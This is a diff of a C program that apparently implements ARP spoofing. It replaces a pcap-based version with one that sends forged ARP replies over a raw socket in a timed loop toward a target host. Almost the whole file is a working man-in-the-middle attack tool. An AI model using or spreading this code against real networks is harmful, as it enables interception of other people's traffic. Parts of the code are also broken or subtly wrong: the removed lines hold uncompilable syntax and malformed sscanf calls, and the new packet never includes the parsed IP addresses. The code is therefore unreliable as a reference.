@@ -1,216 +1,152 @@
 #include "inquisitor.h"
 
-void	signal_handler(int signo)
-{
-	struct pcap_stat	stats;
+#define IP4LEN 4
+#define PKTLEN sizeof(struct ether_header) + sizeof(struct ether_arp)
 
-	if (signo == SIGINT)
-	{
-		printf("Exiting...\n");
-		if (pcap_stats(handle, &stats) == 0)
-		{
-			printf("\n%d packets captured\n", packets);
-			printf("%d packets received\n", stats.ps_recv);
-			printf("%d packets dropped\n", stats.ps_drop);
-		}
-		pcap_close(handle);
-		exit(0);
-	}
+int	sock;
+
+static void	usage(void)
+{
+	fprintf(stderr, "Usage: ./arp-spoof [-h] [-i interface] [-v]\n");
+	fprintf(stderr, "Options:\n");
+	fprintf(stderr, "  -h\t\tPrint this help message\n");
+	fprintf(stderr, "  -i interface\tSpecify the interface to use\n");
+	fprintf(stderr, "  -v\t\tVerbose mode\n");
 }
 
-static pcap_t	*create_pcap_handle(const char *dev, char *errbuf)
+static void	sigint_handler(int signum)
 {
-	pcap_t				*handle;
-	pcap_if_t			*alldevs;
-	struct bpf_program	bfp;
-	bpf_u_int32			mask;
-	bpf_u_int32			srcip;
-
-	if (!*dev)
-	{
-		if (pcap_findalldevs(&alldevs, errbuf) == -1)
-			return (NULL);
-		dev = alldevs->name;
-	}
-	if (pcap_lookupnet(dev, &srcip, &mask, errbuf) == PCAP_ERROR)
-	{
-		fprintf(stderr, "pcap_lookupnet: %s\n", errbuf);
-		return (NULL);
-	}
-	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
-	if (handle == NULL)
-	{
-		fprintf(stderr, "pcap_open_live: %s\n", errbuf);
-		return (NULL);
-	}
-	if (pcap_compile(handle, &bfp, "arp", 0, mask) == PCAP_ERROR)
-	{
-		fprintf(stderr, "pcap_compile: %s\n", pcap_geterr(handle));
-		return (NULL);
-	}
-	if (pcap_setfilter(handle, &bfp) == PCAP_ERROR)
-	{
-		fprintf(stderr, "pcap_setfilter: %s\n", pcap_geterr(handle));
-		return (NULL);
-	}
-	return (handle);
+	(void)signum;
+	close(sock);
+	printf("\n");
+	exit(0);
 }
 
-static void get_link_addr(pcap_t *handle)
+static void	set_arp_spoof(const char *dev, char *ip_src, char *mac_src, char *ip_target, char *mac_target, bool verbose)
 {
-	int	link_type;
+	char				packet[PKTLEN];
+	struct ether_header	*eth;
+	struct ether_arp	*arp;
+	struct sockaddr_ll	device;
+	u_char				source_ip[IP4LEN];
+	u_char				target_ip[IP4LEN];
+	u_char				source_mac[MAC_ADDR_LEN];
+	u_char				target_mac[MAC_ADDR_LEN];
+	int					elapsed_time;
 
-	link_type = pcap_datalink(handle);
-	if (link_type == PCAP_ERROR_NOT_ACTIVATED)
+	if ((sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0)
 	{
-		fprintf(stderr, "Error: pcap handle not activated\n");
+		perror("socket");
 		exit(1);
 	}
-	switch(link_type)
+	if (!inet_pton(AF_INET, ip_src, source_ip))
 	{
-		case DLT_NULL:
-			linkhdrlen = 4;
-			break;
-		case DLT_EN10MB:
-			linkhdrlen = 14;
-			break;
-		case DLT_IEEE802:
-			linkhdrlen = 22;
-			break;
-		case DLT_FDDI:
-			linkhdrlen = 21;
-			break;
-		case DLT_PPP:
-			linkhdrlen = 24;
-			break;
-		default:
-			fprintf(stderr, "Error: Unsupported link type\n");
-			linkhdrlen = 0;
+		fprintf(stderr, "Invalid IP address format for source IP: %s\n", ip_src);
+		exit(1);
 	}
-}
-
-static void send_arp_poison(pcap_t *handle, uchar *source_ip, u_char *target_ip, u_char *source_mac, u_char *target_mac, bool verbose)
-{
-    u_char      packet[42];
-    arphdr_t    *arpheader;  
-
-    memset(packet, 0, sizeof(packet));
-    memcpy(packet, target_mac, MAC_ADDR_LEN);
-    memcpy(packet + 6, source_mac, MAC_ADDR_LEN);
-    packet[12] = 0x08;
-    packet[13] = 0x06;
-    arpheader = (arphdr_t *)(packet + 14);
-    arpheader->htype = htons(1);
-    arpheader->ptype = htons(0x800);
-    arpheader->hlen = MAC_ADDR_LEN;
-    arpheader->plen = IP_ADDR_LEN;
-    arpheader->oper = htons(2);
-    memcpy(arpheader->sha, source_mac, MAC_ADDR_LEN);
-    memcpy(arpheader->tha, target_mac, MAC_ADDR_LEN);
-    memcpy(arpheader->, target_ip, IP_ADDR_LEN);
-    if (pcap_sendpacket(handle, packet, 42) != 0)
-        fprintf(stderr, "Error: error sending the ARP packet: %s\n", pcap_geterr(handle));
-}
-
-static void	check_and_start(pcap_t *handle, char *ip_src, char *mac_src, char *ip_target, char *mac_target, bool verbose)
-{
-    u_char  source_ip[4];
-    u_char  target_ip[4];
-    u_char  source_mac[MAC_ADDR_LEN];
-    u_char  target_mac[MAC_ADDR_LEN];
-	int		elapsed_time;
-
+	if (!inet_pton(AF_INET, ip_target, target_ip))
+	{
+		fprintf(stderr, "Invalid IP address format for target IP: %s\n", ip_target);
+		exit(1);
+	}
+	if (sscanf(mac_src, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+				&source_mac[0], &source_mac[1], &source_mac[2],
+				&source_mac[3], &source_mac[4], &source_mac[5]) != 6)
+	{
+		fprintf(stderr, "Invalid MAC address format for source MAC: %s\n", mac_src);
+		exit(1);
+	}
+	if (sscanf(mac_target, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
+				&target_mac[0], &target_mac[1], &target_mac[2],
+				&target_mac[3], &target_mac[4], &target_mac[5]) != 6)
+	{
+		fprintf(stderr, "Invalid MAC address format for target MAC: %s\n", mac_target);
+		exit(1);
+	}
 	elapsed_time = 0;
-    if (!inet_pton(AF_INET, ip_src, source_ip))
-    {
-        fprintf(stderr, "Invalid IP address format for source ip: %s\n", ip_src);
-        exit (1);
-    }
-    if (!inet_pton(AF_INET, ip_target, target_ip))
-    {
-        fprintf(stderr, "Invalid IP address format for target ip: %s\n", ip_target);
-        exit (1);
-    }
-    if (sscanf(mac_src, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-                source_mac[0], source_mac[1], source_mac[2],
-                source_mac[4], source_mac[5]) != 6)
-    {
-        fprintf(stderr, "Invalid MAC address format for source MAC: %s\n", mac_src);
-        exit (1);
-    }
-    if (sscanf(mac_target, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
-                target_mac[0], target_mac[1], target_mac[2],
-                target_mac[4], target_mac[5]) != 6)
-    {
-        fprintf(stderr, "Invalid MAC address format for target MAC: %s\n", mac_target);
-        exit (1);
-    }
-    while (elapsed_time < POISON_DURATION)
-    {
-        send_arp_poison(handle, source_ip, target_ip, source_mac, target_mac, verbose);
-        sleep(POISON_INTERVAL);
+	eth = (struct ether_header *)packet;
+	arp = (struct ether_arp *)(packet + sizeof(struct ether_header));
+	memset(packet, 0, PKTLEN);
+	memset(eth->ether_dhost, 0xff, ETH_ALEN);
+	memcpy(eth->ether_shost, source_mac, ETH_ALEN);
+	eth->ether_type = htons(ETH_P_ARP);
+	arp->ea_hdr.ar_hrd = htons(ARPHRD_ETHER);
+	arp->ea_hdr.ar_pro = htons(ETH_P_IP);
+	arp->ea_hdr.ar_hln = ETH_ALEN;
+	arp->ea_hdr.ar_pln = IP4LEN;
+	arp->ea_hdr.ar_op = htons(ARPOP_REPLY);
+	memset(arp->arp_tha, 0xff, ETH_ALEN);
+	memset(arp->arp_tpa, 0x00, IP4LEN);
+	memset(&device, 0, sizeof(device));
+	device.sll_ifindex = if_nametoindex(dev);
+	device.sll_family = AF_PACKET;
+	memcpy(device.sll_addr, source_mac, ETH_ALEN);
+	device.sll_halen = htons(ETH_ALEN);
+	while (elapsed_time < POISON_DURATION)
+	{
+		if (sendto(sock, packet, PKTLEN, 0, (struct sockaddr *)&device, sizeof(device)) < 0)
+		{
+			fprintf(stderr, "sendto: %s\n", strerror(errno));
+			exit(1);
+		}
+		if (verbose)
+			printf("Sent ARP packet to %s\n", ip_target);
+		sleep(POISON_INTERVAL);
 		elapsed_time += POISON_INTERVAL;
-    }
+	}
 }
 
 int	main(int argc, char **argv)
 {
 	char		errbuf[PCAP_ERRBUF_SIZE];
 	const char	*dev;
-	int			opt;
-	bool		verbose;
 	char		*ip_src;
-	char		*mac_src;
 	char		*ip_target;
+	char		*mac_src;
 	char		*mac_target;
+	bool		verbose;
+	int			opt;
 
-	if (geteuid() != 0)
+	if (getuid() != 0)
 	{
-		fprintf(stderr, "You must be root to run this program\n");
-		exit(1);
+		fprintf(stderr, "You must be root to use this program\n");
+		return (1);
+	}
+	if (argc < 2)
+	{
+		usage();
+		return (1);
 	}
 	verbose = false;
 	while ((opt = getopt(argc, argv, "hi:v")) != -1)
 	{
-		switch(opt)
+		switch (opt)
 		{
 			case 'h':
-				printf("Usage: %s [-h] [-i interface] [-v verbose] <ip_source> <mac_source> <ip_target> <mac_target>\n", argv[0]);
-				exit(0);
+				usage();
+				return (0);
 			case 'i':
 				dev = optarg;
-				break;
+				break ;
 			case 'v':
 				verbose = true;
-				break;
+				break ;
 			default:
-				fprintf(stderr, "Usage: %s [-h] [-i interface] [-v verbose] <ip_source> <mac_source> <ip_target> <mac_target>\n", argv[0]);
-				exit(1);
+				usage();
+				return (1);
 		}
 	}
 	if (argc - optind < 4)
 	{
-		fprintf(stderr, "Usage: %s [-h] [-i interface] [-v verbose] <ip_source> <mac_source> <ip_target> <mac_target>\n", argv[0]);
-		exit(1);
+		usage();
+		return (1);
 	}
 	ip_src = argv[optind];
 	mac_src = argv[optind + 1];
 	ip_target = argv[optind + 2];
 	mac_target = argv[optind + 3];
-	signal(SIGINT, signal_handler);
-	handle = create_pcap_handle(dev, errbuf);
-	if (handle == NULL)
-	{
-		printf("Error: %s\n", errbuf);
-		exit(1);
-	}
-	printf("Filtering ARP packets on %s\n", dev);
-	get_link_addr(handle);
-	if (linkhdrlen == 0)
-	{
-		fprintf(stderr, "Error: Could not determine link-layer header length\n");
-		exit(1);
-	}
-	check_and_start(handle, ip_src, mac_src, ip_target, mac_target, verbose);
+	signal(SIGINT, sigint_handler);
+	set_arp_spoof(dev, ip_src, mac_src, ip_target, mac_target, verbose);
+	(void)errbuf;
 	return (0);
 }
